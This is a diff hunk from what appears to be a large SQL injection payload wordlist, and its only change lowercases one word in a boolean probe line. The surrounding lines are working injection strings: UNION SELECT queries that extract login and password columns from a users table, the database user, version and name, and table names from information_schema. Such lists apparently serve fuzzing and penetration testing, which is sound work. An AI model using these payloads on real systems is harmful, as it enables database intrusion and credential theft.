@@ -6960,7 +6960,7 @@
 252 union select concat_ws(0x3a,login,pass) from mp_xteam.users
 -2532 UNION SELECT 1,2,aes_decrypt(aes_encrypt(concat(user(),0x3a,version(),0x3a,database()),1),1),4,5,6,7,8,9,10,11,12,13,14,15,16/*
 2535 and 1=0 UNION SELECT 1,2,version(),4,5,6,7 -- 
-253 and substring(@@version,1,1)=4===>False
+253 and substring(@@version,1,1)=4===>false
 -253 union select 1,2,3,4,5,unhex(hex(table_name)),7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0 from information_schema.tables-- 
 -253 union select 1,2,3,concat(0x2a,user(),0x2a,database(),0x2a,version())
 -253 union select 1,concat_ws(char(58,58),user(),database(),version()),3,4,5,6,7/*
